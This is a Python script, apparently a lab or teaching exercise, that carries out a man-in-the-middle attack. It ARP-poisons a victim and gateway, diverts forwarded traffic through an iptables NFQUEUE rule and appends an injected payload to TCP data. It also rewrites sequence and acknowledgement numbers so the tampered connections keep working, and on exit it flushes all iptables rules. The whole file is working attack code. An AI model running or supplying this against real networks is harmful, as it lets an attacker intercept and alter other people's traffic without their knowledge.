from typing import Dict
from scapy.all import conf, Packet
from scapy.packet import Raw
from scapy.layers.inet import TCP, IP

import logging

from netfilterqueue import NetfilterQueue as NFQ
from arp_spoofing import create_arp_poisoning_thread, restore_network, stop_thread
from os import system

conf.verb = 0
step = 1

seq_to_updated: Dict[str, str] = dict()
ack_to_updated: Dict[str, str] = dict()

gateway_ip, victim_ip = '198.10.0.1', '198.10.0.2'

injected_payload = b" | hacked :)"


def process_packet(packet: Packet):
    """
    1) Receives a scapy packet
    2) Prints basic info about it
    3) If the packet has an acknowledgement number in <ack_to_updated>, we modify it.
    4) If the packet contains a raw message, we append <injected_payload> to it & rebuild the packet.
    """

    global step

    logging.info(f'{step}) {packet[IP].src[-1]}->{packet[IP].dst[-1]}, ({packet[TCP].seq % 1000}, {packet[TCP].ack % 1000}), \
        [{packet[TCP].flags}], [{packet[Raw] if Raw in packet else "NO PAYLOAD"}]')

    step += 1

    seq, ack = packet[TCP].seq, packet[TCP].ack

    if ack in ack_to_updated.keys():
        packet[TCP].ack = ack_to_updated[ack]

    if packet.haslayer(Raw):
        initial_payload_length = len(packet[TCP].payload)

        packet[TCP].payload = Raw(
            bytes(packet[TCP].payload) + injected_payload)

        modified_payload_length = len(packet[TCP].payload)

        ack_to_updated[seq + modified_payload_length] = seq + \
            initial_payload_length

        del packet[TCP].chksum
        del packet[IP].chksum
        del packet[IP].len

    packet = IP(packet.build())

    return packet


def preprocess_packets(packet):
    """
    1) Receives a fnqueue packet
    2) Extracts its payload
    3) Transforms it to a scapy packet
    4) Modifies the payload using a custom function
    5) Sets the packet payload to the modified one and sends the packet
    """

    bytez = packet.get_payload()
    scapy_packet = IP(bytez)
    scapy_packet = process_packet(scapy_packet)
    packet.set_payload(bytes(scapy_packet))
    packet.accept()


def main():
    global gateway, victim_ip

    queue_num = 32

    create_arp_poisoning_thread(gateway_ip, victim_ip)

    nfqueue = NFQ()

    try:
        logging.info("Capturing and modifying packets.")

        system(
            f"iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}")

        nfqueue.bind(queue_num, preprocess_packets)
        nfqueue.run()

    except KeyboardInterrupt:
        logging.info("Exiting.")
        nfqueue.unbind()
        system("iptables -F")

    logging.info("Attack is done.")

    stop_thread()

    restore_network(gateway_ip, victim_ip)


if __name__ == '__main__':
    main()
